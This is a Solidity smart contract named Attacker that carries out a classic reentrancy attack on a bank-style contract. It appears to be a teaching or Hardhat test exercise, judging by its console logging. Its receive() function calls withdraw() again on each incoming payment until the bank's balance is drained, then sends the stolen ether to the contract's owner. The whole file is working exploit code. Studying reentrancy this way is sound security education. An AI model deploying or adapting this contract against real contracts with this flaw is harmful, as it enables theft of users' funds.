//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract Attacker {

    IBank public bank;
    address private owner;

    constructor(address _bank) {
        bank = IBank(_bank);
        owner = msg.sender;
    }


    function deposit() external payable{
         bank.deposit{value : msg.value}();    
    }

    function attack() external payable{
       
        bank.withdraw();

    }

    receive() external payable{
        console.log("Withdraw more money ");
        if(address(bank).balance > 1){
            console.log("Withdraw more money ");
            bank.withdraw();
        }else{
            console.log("FINALLY transffered!!!!!!");
            payable(owner).transfer(address(this).balance);
        }
    }

}

interface IBank {

    function deposit() external payable;
    function withdraw() external;
    
}